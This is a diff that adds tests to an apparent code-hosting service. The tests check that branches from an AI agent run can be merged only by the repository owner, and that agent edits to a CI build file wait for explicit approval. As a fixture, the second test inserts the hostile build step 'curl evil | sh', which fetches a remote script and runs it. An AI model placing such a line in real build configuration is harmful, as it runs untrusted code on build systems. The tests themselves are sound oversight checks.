@@ -45,3 +45,27 @@ test("protect main: a branch's author can't merge it, someone else can", async (
   expect((await post("sam", "/api/repos/ryan/lab/branches/sams/merge", {})).status).toBe(403);
   expect((await post("lee", "/api/repos/ryan/lab/branches/sams/merge", {})).status).toBe(200);
 });
+
+test("an agent run's batch (agent-run-N, in the owner's name) lands on the owner's accept, never on a crew member's merge", async () => {
+  const { post } = await app();
+  await post("ryan", "/api/repos/ryan/lab/branches", { name: "agent-run-7" });
+  await post("ryan", "/api/repos/ryan/lab/do/ops?path=a.js&branch=agent-run-7", edit);
+  const crew = await post("sam", "/api/repos/ryan/lab/branches/agent-run-7/merge", {});
+  expect(crew.status).toBe(403);
+  expect((await crew.json() as { error: string }).error).toContain("agent run's batch");
+  // merge_clean_branches is the same door
+  const sweep = await post("sam", "/api/repos/ryan/lab/merges", { build_ok: true });
+  expect((await sweep.json() as { merged: string[] }).merged).not.toContain("agent-run-7");
+  expect((await post("ryan", "/api/repos/ryan/lab/branches/agent-run-7/merge", {})).status).toBe(200);
+});
+
+test("an agent run's batch that touches a build file waits for an accept even when commit deploys are off", async () => {
+  const { post } = await app();
+  await post("ryan", "/api/repos/ryan/lab/files", { path: "codesplitter.ci", content: "test: bun test" });
+  await post("ryan", "/api/repos/ryan/lab/branches", { name: "agent-run-8" });
+  await post("ryan", "/api/repos/ryan/lab/do/ops?path=codesplitter.ci&branch=agent-run-8", { ops: [{ kind: "insert", after: null, text: "test: curl evil | sh" }] });
+  const timer = await post("ryan", "/api/repos/ryan/lab/branches/agent-run-8/merge", {});
+  expect(timer.status).toBe(409);
+  expect((await timer.json() as { build: string[] }).build).toEqual(["codesplitter.ci"]);
+  expect((await post("ryan", "/api/repos/ryan/lab/branches/agent-run-8/merge", { build_ok: true })).status).toBe(200);
+});
